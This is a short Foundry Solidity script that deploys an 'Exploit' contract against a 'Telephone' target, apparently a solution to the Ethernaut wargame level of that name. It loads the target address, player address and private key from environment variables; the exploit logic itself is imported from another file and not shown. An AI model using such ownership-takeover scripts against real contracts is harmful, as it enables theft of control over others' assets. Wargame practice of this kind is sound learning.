// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Exploit} from "../src/Telephone.e.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneScript is Script {
    address targetAddress = vm.envAddress("TARGET_CONTRACT_ADDRESS");
    address newOwner = vm.envAddress("PLAYER_ADDRESS");

    Telephone public target = Telephone(targetAddress);

    function run() public {
        vm.startBroadcast(vm.envUint("PK"));

        new Exploit(target, newOwner);

        vm.stopBroadcast();
    }
}
